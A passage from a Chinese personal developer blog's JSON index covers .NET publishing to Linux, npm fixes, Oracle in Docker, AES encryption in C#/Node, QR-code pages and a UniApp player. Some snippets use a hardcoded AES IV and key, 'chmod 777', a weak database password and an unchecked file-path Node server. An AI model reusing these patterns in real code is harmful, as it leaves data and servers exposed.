updated successfully.\u0026#34;); } } public class MDataType { // Define M JSON structure here public string Name { get; set; } public int Age { get; set; } } } Newtonsoft.Json\nGET请求：http://localhost:5000/json\nPOST请求：使用类似以下的JSON数据发送一个POST请求到http://localhost:5000/json：\nCopy Code { \u0026#34;name\u0026#34;: \u0026#34;m\u0026#34;, \u0026#34;age\u0026#34;: 30 } 写入\nusing Microsoft.AspNetCore.Mvc; using System.IO; using Newtonsoft.Json; namespace MNamespace.Controllers { [ApiController] [Route(\u0026#34;[controller]\u0026#34;)] public class JsonController : ControllerBase { private readonly string _jsonFilePath = Path.Combine(Directory.GetCurrentDirectory(), \u0026#34;wwwroot\u0026#34;, \u0026#34;data.json\u0026#34;); // GET: /json [HttpGet] public IActionResult GetJson() { if (!System.IO.File.Exists(_jsonFilePath)) return NotFound(\u0026#34;JSON file not found.\u0026#34;); var jsonContent = System.IO.File.ReadAllText(_jsonFilePath); return Content(jsonContent, \u0026#34;application/json\u0026#34;); } // POST: /json [HttpPost] public IActionResult PostJson([FromBody] MDataType data) { var jsonString = JsonConvert.SerializeObject(data); System.IO.File.WriteAllText(_jsonFilePath, jsonString); return Ok(\u0026#34;JSON file updated successfully.\u0026#34;); } } public class MDataType { // Define M JSON structure here public string Name { get; set; } public int Age { get; set; } } } 发布所有 dotnet publish -c Release -o ./publish\nMySolution/ │ ├── MyProjectA/ │ └── MyProjectA.csproj ├── MyProjectB/ │ └── MyProjectB.csproj └── MySolution.sln 如果想只发布 MyProjectA 而不是整个解决方案， 可以导航到 MyProjectA 的目录下执行 dotnet publish 命令， 或者从解决方案的根目录直接指定项目的路径。以下是两种方法：\n方法一：在项目目录中执行命令 cd MySolution/MyProjectA dotnet publish -c Release -o ../../publish 方法二：从解决方案根目录指定项目路径 cd MySolution dotnet publish ./MyProjectA/MyProjectA.csproj -c Release -o ./publish 排除特定项目 dotnet publish 命令本身没有直接支持排除特定项目的选项。 但是，可以通过仅指定要发布的项目来间接实现这一点。 如果需要同时发布多个项目，可以为每个项目单独运行 dotnet publish 命令。\n例如，如果想发布 MyProjectA 和 MyProjectB，但不发布其他任何项目，可以这样做：\ndotnet publish ./MyProjectA/MyProjectA.csproj -c Release -o ./publish dotnet publish ./MyProjectB/MyProjectB.csproj -c Release -o ./publish 这样，只有 MyProjectA 和 MyProjectB 被发布到了 ./publish 目录中，而其他项目则被忽略。\n","permalink":"https://qfsyso.github.io/posts/.net-build-release-4-linux/","summary":"在项目中使用 dotnet publish 命令来发布应用程序。\n将发布的应用程序文件夹复制到 Linux 服务器上。\n在 Linux 服务器上安装 .NET 运行时，如果应用是 self-contained（独立部署）的。\n使用 systemd 创建一个服务单元文件来管理应用作为服务运行。\n启动应用程序服务。\n发布应用程序：\ndotnet publish -c Release -o ./publish 将发布文件夹复制到 Linux 服务器：\nscp -r ./publish [user]@[host]:/var/www/myapp 运行\ndotnet myapp.dll 创建 systemd 服务文件 /etc/systemd/system/myapp.service：\n[Unit] Description=My .NET App [Service] WorkingDirectory=/var/www/myapp ExecStart=/var/www/myapp/MyApp Restart=always RestartSec=10 SyslogIdentifier=dotnet-myapp User=www-data Environment=ASPNETCORE_ENVIRONMENT=Production [Install] WantedBy=multi-user.target 启动服务：\nsudo systemctl enable myapp.service sudo systemctl start myapp.service 确保应用程序配置了正确的端口监听和防火墙规则。\n++++++++++++++++++\u0026ndash;\napi wr wwwroot json\nusing Microsoft.AspNetCore.Mvc; using System.","title":" .NET build release 4 linux"},{"content":"idealTree:npm: sill idealTree buildDeps Err\n#清除缓存\nnpm cache clean --force 出现npm WARN using \u0026ndash;force I sure hope you know what you are doing.用：\nnpm cache verify 设置镜像源： npm config set registry https://registry.npmmirror.com 查看下是否设置成功： npm config get registry https://registry.npmmirror.com\nnpm install ","permalink":"https://qfsyso.github.io/posts/err-idealtreenpm-sill-idealtree/","summary":"idealTree:npm: sill idealTree buildDeps Err\n#清除缓存\nnpm cache clean --force 出现npm WARN using \u0026ndash;force I sure hope you know what you are doing.用：\nnpm cache verify 设置镜像源： npm config set registry https://registry.npmmirror.com 查看下是否设置成功： npm config get registry https://registry.npmmirror.com\nnpm install ","title":"Err idealTree:npm: sill idealTree "},{"content":"使用Docker容器安装Oracle数据库\n安装Docker sudo apt-get update sudo apt-get install docker.io 下载镜像 docker pull registry.cn-hangzhou.aliyuncs.com/zhuyijun/oracle:19c 创建文件 mkdir -p /home/data/oracle/oradata 授权，不授权会导致后面安装失败 chmod 777 /home/data/oracle/oradata docker run -d -p 1521:1521 -p 5500:5500 -e ORACLE_SID=ORCLCDB -e ORACLE_PDB=ORCLPDB -e ORACLE_PWD=123456 -e ORACLE_EDITION=standard -e ORACLE_CHARACTERSET=AL32UTF8 -v /home/data/oracle/oradata:/opt/oracle/oradata --name oracle registry.cn-hangzhou.aliyuncs.com/zhuyijun/oracle:19c 进入\ndocker exec -it oracle-db bash -c \u0026#34;source /home/oracle/.bashrc; sqlplus /nolog\u0026#34; SQL\u0026gt; CONNECT sys as sysdba@your_password SQL\u0026gt; ALTER USER sys IDENTIFIED BY your_password; SQL\u0026gt; CREATE USER your_username IDENTIFIED BY your_password; SQL\u0026gt; GRANT CONNECT, RESOURCE TO your_username; CREATE TABLE test_table ( id NUMBER, name VARCHAR2(50) ); INSERT INTO test_table (id, name) VALUES (1, \u0026#39;Test Name\u0026#39;); COMMIT; SELECT * FROM test_table; CONNECT / AS SYSDBA; 以 SYSDBA 角色连接到数据库。 使用 SYSDBA 角色登录，该角色具有最高级别的数据库权限，允许进行系统级别的管理任务。\nalter user system identified by 密码; 修改系统用户（system）的登录密码。\nCREATE USER hhhhh IDENTIFIED BY 密码; 创建一个新用户 hhhhh，并指定其登录密码。\nGRANT CREATE SESSION TO hhhhh; 允许用户 hhhhh连接到数据库。\nGRANT CREATE TABLE TO hhhhh; 允许用户 hhhhh在数据库中创建新的表。\nALTER USER hhhhh QUOTA UNLIMITED ON USERS; 设置用户 hhhhh 在表空间 USERS 上的存储配额为无限制，允许用户存储数据\n","permalink":"https://qfsyso.github.io/posts/docker-oracle/","summary":"使用Docker容器安装Oracle数据库\n安装Docker sudo apt-get update sudo apt-get install docker.io 下载镜像 docker pull registry.cn-hangzhou.aliyuncs.com/zhuyijun/oracle:19c 创建文件 mkdir -p /home/data/oracle/oradata 授权，不授权会导致后面安装失败 chmod 777 /home/data/oracle/oradata docker run -d -p 1521:1521 -p 5500:5500 -e ORACLE_SID=ORCLCDB -e ORACLE_PDB=ORCLPDB -e ORACLE_PWD=123456 -e ORACLE_EDITION=standard -e ORACLE_CHARACTERSET=AL32UTF8 -v /home/data/oracle/oradata:/opt/oracle/oradata --name oracle registry.cn-hangzhou.aliyuncs.com/zhuyijun/oracle:19c 进入\ndocker exec -it oracle-db bash -c \u0026#34;source /home/oracle/.bashrc; sqlplus /nolog\u0026#34; SQL\u0026gt; CONNECT sys as sysdba@your_password SQL\u0026gt; ALTER USER sys IDENTIFIED BY your_password; SQL\u0026gt; CREATE USER your_username IDENTIFIED BY your_password; SQL\u0026gt; GRANT CONNECT, RESOURCE TO your_username; CREATE TABLE test_table ( id NUMBER, name VARCHAR2(50) ); INSERT INTO test_table (id, name) VALUES (1, \u0026#39;Test Name\u0026#39;); COMMIT; SELECT * FROM test_table; CONNECT / AS SYSDBA; 以 SYSDBA 角色连接到数据库。 使用 SYSDBA 角色登录，该角色具有最高级别的数据库权限，允许进行系统级别的管理任务。","title":" docker oracle"},{"content":" // 加密方法 public static string Encrypt(string plainText, string key) { using (Aes aesAlg = Aes.Create()) { aesAlg.Key = Encoding.UTF8.GetBytes(key); aesAlg.IV = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5, 6];// new byte[16]; // 初始化向量 (IV) 可以设为全零，也可以使用随机值 ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV); using (MemoryStream msEncrypt = new MemoryStream()) { using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write)) using (StreamWriter swEncrypt = new StreamWriter(csEncrypt)) { swEncrypt.Write(plainText); } return Convert.ToBase64String(msEncrypt.ToArray()); } } } // 加密方法 function encrypt(plainText, key) { const iv = Buffer.from([1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5, 6]); // 与C#中相同的IV const cipher = crypto.createCipheriv(\u0026#39;aes-256-cbc\u0026#39;, Buffer.from(key), iv); let encrypted = cipher.update(plainText, \u0026#39;utf8\u0026#39;, \u0026#39;base64\u0026#39;); encrypted += cipher.final(\u0026#39;base64\u0026#39;); return encrypted; } // 填充或截断密钥为32字节 function padKey(key) { return crypto.createHash(\u0026#39;sha256\u0026#39;).update(key).digest(); // 使用 SHA-256 将密钥处理成 32 字节 } AES-256-CBC 算法，密钥必须是 32 字节长。\n可改为 AES-192 AES-192-CBC 加密算法，该算法允许使用 24 字节的密钥。\nconst crypto = require(\u0026#39;crypto\u0026#39;); // 加密方法 function encrypt(plainText, key) { const iv = Buffer.from([1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5, 6]); const cipher = crypto.createCipheriv(\u0026#39;aes-192-cbc\u0026#39;, Buffer.from(key), iv); let encrypted = cipher.update(plainText, \u0026#39;utf8\u0026#39;, \u0026#39;base64\u0026#39;); encrypted += cipher.final(\u0026#39;base64\u0026#39;); return encrypted; } // 解密方法 function decrypt(cipherText, key) { const iv = Buffer.from([1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5, 6]); const decipher = crypto.createDecipheriv(\u0026#39;aes-192-cbc\u0026#39;, Buffer.from(key), iv); let decrypted = decipher.update(cipherText, \u0026#39;base64\u0026#39;, \u0026#39;utf8\u0026#39;); decrypted += decipher.final(\u0026#39;utf8\u0026#39;); return decrypted; } // 测试例子 const key = \u0026#39;thisisaverysecretkey12xx\u0026#39;; // 24字节的key（AES-192） const textToEncrypt = \u0026#39;88\u0026#39;; // 加密 const encryptedText = encrypt(textToEncrypt, key); console.log(\u0026#39;加密后的文本:\u0026#39;, encryptedText); // 解密 const decryptedText = decrypt(encryptedText, key); console.log(\u0026#39;解密后的文本:\u0026#39;, decryptedText); ","permalink":"https://qfsyso.github.io/posts/node-ase-encrypt/","summary":"// 加密方法 public static string Encrypt(string plainText, string key) { using (Aes aesAlg = Aes.Create()) { aesAlg.Key = Encoding.UTF8.GetBytes(key); aesAlg.IV = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5, 6];// new byte[16]; // 初始化向量 (IV) 可以设为全零，也可以使用随机值 ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV); using (MemoryStream msEncrypt = new MemoryStream()) { using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write)) using (StreamWriter swEncrypt = new StreamWriter(csEncrypt)) { swEncrypt.","title":"node ase encrypt"},{"content":"qrcode \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.6.0.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.staticfile.org/jquery.qrcode/1.0/jquery.qrcode.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;div id=\u0026#34;qrcode\u0026#34; style=\u0026#34;width: 200px; height: 200px;\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; $(document).ready(function () { var qrData = \u0026#34;https://www.qq.com?p=100\u0026#34;; $(\u0026#34;#qrcode\u0026#34;).qrcode({ width: 200, height: 200, text: qrData }); }); \u0026lt;/script\u0026gt; Node Server const http = require(\u0026#39;http\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const path = require(\u0026#39;path\u0026#39;); const server = http.createServer((req, res) =\u0026gt; { if (req.url === \u0026#39;/\u0026#39;) { req.url = \u0026#39;/index.html\u0026#39;; } const filePath = path.join(__dirname, \u0026#39;public\u0026#39;, req.url); fs.readFile(filePath, (err, content) =\u0026gt; { if (err) { // 读取自定义的404页面 fs.readFile(path.join(__dirname, \u0026#39;public\u0026#39;, \u0026#39;404.html\u0026#39;), (err, content) =\u0026gt; { if (err) { res.writeHead(500, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39; }); res.end(\u0026#39;500 Internal Server Error\u0026#39;); } else { res.writeHead(404, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39; }); res.end(content); } }); } else { res.writeHead(200, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39; }); res.end(content); } }); }); server.listen(process.env.PORT || 3919, \u0026#39;localhost\u0026#39;, () =\u0026gt; { console.log(`server listen at: ${process.env.PORT || 3919}`); }); /public/index.html\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Generate QR Code\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.6.0.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.staticfile.org/jquery.qrcode/1.0/jquery.qrcode.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;qrcode\u0026#34; style=\u0026#34;width: 200px; height: 200px;\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; $(document).ready(function () { var qrData = \u0026#34;https://www.qq.com?p=100\u0026#34;; $(\u0026#34;#qrcode\u0026#34;).qrcode({ width: 200, height: 200, text: qrData }); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 自定义 \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;qrInput\u0026#34; placeholder=\u0026#34;data...\u0026#34;\u0026gt; \u0026lt;button id=\u0026#34;generateQR\u0026#34;\u0026gt;Generate\u0026lt;/button\u0026gt; \u0026lt;div id=\u0026#34;qrcode\u0026#34; style=\u0026#34;width: 200px; height: 200px;\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; $(\u0026#39;#generateQR\u0026#39;).click(function () { $(\u0026#34;#qrcode\u0026#34;).empty(); // 清空之前的二维码 var qrData = $(\u0026#39;#qrInput\u0026#39;).val(); // 获取输入框中的值 if (qrData) { $(\u0026#34;#qrcode\u0026#34;).qrcode({ width: 200, // 设置宽度 height: 200, // 设置高度 text: qrData // 设置二维码的内容 }); } else { alert(\u0026#39;请输入要生成的二维码内容\u0026#39;); } }); url 添加二维码 \u0026lt;div class=\u0026#34;url-card col-6 col-sm-6 col-md-4 col-xl-5a col-xxl-6a\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;url-body default\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;https://www.yuque.com/\u0026#34; target=\u0026#34;_blank\u0026#34; data-id=\u0026#34;\u0026#34; data-url=\u0026#34;https://www.yuque.com/\u0026#34; class=\u0026#34;card no-c mb-4\u0026#34; data-toggle=\u0026#34;tooltip\u0026#34; data-placement=\u0026#34;bottom\u0026#34; data-original-title=\u0026#34;专业的云端知识库。\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;url-content d-flex align-items-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;url-img mr-2 d-flex align-items-center justify-content-center\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;lazy loaded\u0026#34; src=\u0026#34;assets/images/logos/%e8%af%ad%e9%9b%80.webp\u0026#34; data-src=\u0026#34;assets/images/logos/%e8%af%ad%e9%9b%80.webp\u0026#34; onerror=\u0026#34;javascript:this.src=\u0026#39;assets\\/images\\/logos\\/default.webp\u0026#39;\u0026#34; alt=\u0026#34;语雀\u0026#34; data-was-processed=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;url-info flex-fill\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;text-sm overflowClip_1\u0026#34;\u0026gt; \u0026lt;strong\u0026gt;语雀\u0026lt;/strong\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;p class=\u0026#34;overflowClip_1 m-0 text-muted text-xs\u0026#34;\u0026gt;专业的云端知识库。\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;https://www.yuque.com/\u0026#34; class=\u0026#34;togo text-center text-muted is-views\u0026#34; data-id=\u0026#34;689\u0026#34; data-toggle=\u0026#34;tooltip\u0026#34; data-placement=\u0026#34;right\u0026#34; title=\u0026#34;\u0026#34; rel=\u0026#34;nofollow\u0026#34; data-original-title=\u0026#34;直达\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;iconfont icon-goto\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; ``` 添加个按钮，移动上去则 为 data-url=\u0026#34;\u0026#34; 生成二维码 并展示，移出则消失。 以下是使用 HTML、JavaScript 和一个常用的二维码生成库（这里以qrcodejs2为例，需要引入其相关的库文件，可以通过 CDN 引入 \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;）来实现需求的代码示例： ```html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;语雀二维码生成示例\u0026lt;/title\u0026gt; \u0026lt;!-- 引入二维码生成库（这里以qrcodejs2为例，实际使用时确保能正确引入该库文件） --\u0026gt; \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; /* 简单样式，用于展示二维码的容器 */ .qrcode-container { display: none; position: absolute; border: 1px solid #ccc; padding: 10px; background-color: white; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;url-card col-6 col-sm-6 col-md-4 col-xl-5a col-xxl-6a\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;url-body default\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;https://www.yuque.com/\u0026#34; target=\u0026#34;_blank\u0026#34; data-id=\u0026#34;\u0026#34; data-url=\u0026#34;https://www.yuque.com/\u0026#34; class=\u0026#34;card no-c mb-4\u0026#34; data-toggle=\u0026#34;tooltip\u0026#34; data-placement=\u0026#34;bottom\u0026#34; data-original-title=\u0026#34;专业的云端知识库。\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;url-content d-flex align-items-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;url-img mr-2 d-flex align-items-center justify-content-center\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;lazy loaded\u0026#34; src=\u0026#34;assets/images/logos/%e8%af%ad%e9%9b%80.webp\u0026#34; data-src=\u0026#34;assets/images/logos/%e8%af%ad%e9%9b%80.webp\u0026#34; onerror=\u0026#34;javascript:this.src=\u0026#39;assets\\/images\\/logos\\/default.webp\u0026#39;\u0026#34; alt=\u0026#34;语雀\u0026#34; data-was-processed=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;url-info flex-fill\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;text-sm overflowClip_1\u0026#34;\u0026gt; \u0026lt;strong\u0026gt;语雀\u0026lt;/strong\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;p class=\u0026#34;overflowClip_1 m-0 text-muted text-xs\u0026#34;\u0026gt;专业的云端知识库。\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;https://www.yuque.com/\u0026#34; class=\u0026#34;togo text-center text-muted is-views\u0026#34; data-id=\u0026#34;689\u0026#34; data-toggle=\u0026#34;tooltip\u0026#34; data-placement=\u0026#34;right\u0026#34; title=\u0026#34;\u0026#34; rel=\u0026#34;nofollow\u0026#34; data-original-title=\u0026#34;直达\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;iconfont icon-goto\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;!-- 添加按钮 --\u0026gt; \u0026lt;button id=\u0026#34;generate-qr-btn\u0026#34;\u0026gt;生成语雀二维码\u0026lt;/button\u0026gt; \u0026lt;!-- 用于展示二维码的容器 --\u0026gt; \u0026lt;div id=\u0026#34;qrcode-container\u0026#34; class=\u0026#34;qrcode-container\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; JavaScript 部分\nwindow.onload = function () { const generateBtn = document.getElementById(\u0026#39;generate-qr-btn\u0026#39;); const qrCodeContainer = document.getElementById(\u0026#39;qrcode-container\u0026#39;); const targetLink = document.querySelector(\u0026#39;a[href=\u0026#34;https://www.yuque.com/\u0026#34;]\u0026#39;).dataset.url; generateBtn.addEventListener(\u0026#39;mouseover\u0026#39;, function () { const qrcode = new QRCode(qrCodeContainer, { text: targetLink, width: 128, height: 128 }); qrCodeContainer.style.display = \u0026#39;block\u0026#39;; }); generateBtn.addEventListener(\u0026#39;mouseout\u0026#39;, function () { qrCodeContainer.style.display = \u0026#39;none\u0026#39;; }); }; 上述代码的实现步骤如下： HTML 结构调整： 在原有的 HTML 结构基础上，添加了一个按钮元素，其id为generate-qr-btn，用于触发二维码生成的交互操作。 同时添加了一个div元素作为二维码展示的容器，其id为qrcode-container，并通过 CSS 设置初始状态为不显示（display: none）。 JavaScript 逻辑： 页面加载完成后（通过window.onload事件），获取按钮元素和二维码容器元素以及目标链接（从对应a标签的data-url属性获取）。 给按钮添加mouseover（鼠标移入）事件监听器，在事件处理函数中，使用qrcodejs2库创建一个二维码实例，并将目标链接作为要编码的内容传入，设置好合适的宽度和高度（这里示例为 128px），同时将二维码容器的display属性设置为block使其显示出来。\ndata-target-url= \u0026lt;div class=\u0026#34;url-card col-6 col-sm-6 col-md-4 col-xl-5a col-xxl-6a\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;url-body default\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;https://www.yuque.com/\u0026#34; target=\u0026#34;_blank\u0026#34; data-id=\u0026#34;\u0026#34; data-url=\u0026#34;https://www.yuque.com/\u0026#34; class=\u0026#34;card no-c mb-4\u0026#34; data-toggle=\u0026#34;tooltip\u0026#34; data-placement=\u0026#34;bottom\u0026#34; data-original-title=\u0026#34;专业的云端知识库。\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;url-content d-flex align-items-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;url-img mr-2 d-flex align-items-center justify-content-center\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;lazy loaded\u0026#34; src=\u0026#34;./We1_files/images/logos/%e8%af%ad%e9%9b%80.webp\u0026#34; data-src=\u0026#34;./We1_files/images/logos/%e8%af%ad%e9%9b%80.webp\u0026#34; alt=\u0026#34;语雀\u0026#34; data-was-processed=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;url-info flex-fill\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;text-sm overflowClip_1\u0026#34;\u0026gt; \u0026lt;strong\u0026gt;语雀\u0026lt;/strong\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;p class=\u0026#34;overflowClip_1 m-0 text-muted text-xs\u0026#34;\u0026gt;专业的云端知识库。\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;!-- 添加按钮，并添加自定义属性data-target-url来指定要生成二维码的目标链接 --\u0026gt; \u0026lt;button id=\u0026#34;generate-qr-btn\u0026#34; data-target-url=\u0026#34;https://www.yuque.com/\u0026#34;\u0026gt;生成语雀二维码\u0026lt;/button\u0026gt; \u0026lt;!-- 用于展示二维码的容器 --\u0026gt; \u0026lt;div id=\u0026#34;qrcode-container\u0026#34; class=\u0026#34;qrcode-container\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;a href=\u0026#34;https://www.yuque.com/\u0026#34; class=\u0026#34;togo text-center text-muted is-views\u0026#34; data-id=\u0026#34;689\u0026#34; data-toggle=\u0026#34;tooltip\u0026#34; data-placement=\u0026#34;right\u0026#34; title=\u0026#34;\u0026#34; rel=\u0026#34;nofollow\u0026#34; data-original-title=\u0026#34;直达\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;iconfont icon-goto\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; window.onload = function () { const generateBtn = document.getElementById(\u0026#39;generate-qr-btn\u0026#39;); const qrCodeContainer = document.getElementById(\u0026#39;qrcode-container\u0026#39;); generateBtn.addEventListener(\u0026#39;mouseover\u0026#39;, function () { // 从按钮的自定义属性data-target-url获取要生成二维码的目标链接 const targetLink = generateBtn.dataset.targetUrl; const qrcode = new QRCode(qrCodeContainer, { text: targetLink, width: 128, height: 128 }); qrCodeContainer.style.display = \u0026#39;block\u0026#39;; }); generateBtn.addEventListener(\u0026#39;mouseout\u0026#39;, function () { qrCodeContainer.style.display = \u0026#39;none\u0026#39;; }); }; 在按钮元素上新增了一个自定义属性data-target-url，并将需要生成二维码对应的目标链接（这里是语雀官网链接）赋值给该属性。 这样，在不同的场景下，如果要为其他链接生成二维码，只需要修改按钮这个自定义属性的值即可，而不需要去修改 JavaScript 代码中选择元素获取链接的逻辑。\n","permalink":"https://qfsyso.github.io/posts/js-qrcode/","summary":"qrcode \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.6.0.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.staticfile.org/jquery.qrcode/1.0/jquery.qrcode.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;div id=\u0026#34;qrcode\u0026#34; style=\u0026#34;width: 200px; height: 200px;\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; $(document).ready(function () { var qrData = \u0026#34;https://www.qq.com?p=100\u0026#34;; $(\u0026#34;#qrcode\u0026#34;).qrcode({ width: 200, height: 200, text: qrData }); }); \u0026lt;/script\u0026gt; Node Server const http = require(\u0026#39;http\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const path = require(\u0026#39;path\u0026#39;); const server = http.createServer((req, res) =\u0026gt; { if (req.url === \u0026#39;/\u0026#39;) { req.url = \u0026#39;/index.html\u0026#39;; } const filePath = path.join(__dirname, \u0026#39;public\u0026#39;, req.url); fs.readFile(filePath, (err, content) =\u0026gt; { if (err) { // 读取自定义的404页面 fs.","title":"js qrcode"},{"content":"前言 音乐APP版权/广告问题，让听歌体验很差，所以自己整个简单的播放器~\nUniapp MP3 1. 创建项目 在 HBuilderX 中，新建一个 UniApp 项目，项目结构如下：\n- pages/ - index/ - index.vue - static/ - manifest.json - pages.json 2. 页面设计和逻辑 index.vue 文件 在 pages/index/index.vue 文件中实现播放器的界面和逻辑：\n\u0026lt;template\u0026gt; \u0026lt;view class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;text class=\u0026#34;title\u0026#34;\u0026gt;UniApp 音乐播放器\u0026lt;/text\u0026gt; \u0026lt;view class=\u0026#34;controls\u0026#34;\u0026gt; \u0026lt;button @click=\u0026#34;prevTrack\u0026#34;\u0026gt;上一首\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;playPause\u0026#34;\u0026gt;{{ isPlaying ? \u0026#39;暂停\u0026#39; : \u0026#39;播放\u0026#39; }}\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;nextTrack\u0026#34;\u0026gt;下一首\u0026lt;/button\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;text\u0026gt;{{ currentTrack.name }}\u0026lt;/text\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { data() { return { audioContext: null, isPlaying: false, currentTrackIndex: 0, tracks: [ { name: \u0026#39;歌曲 1\u0026#39;, url: \u0026#39;https://example.com/song1.mp3\u0026#39; }, { name: \u0026#39;歌曲 2\u0026#39;, url: 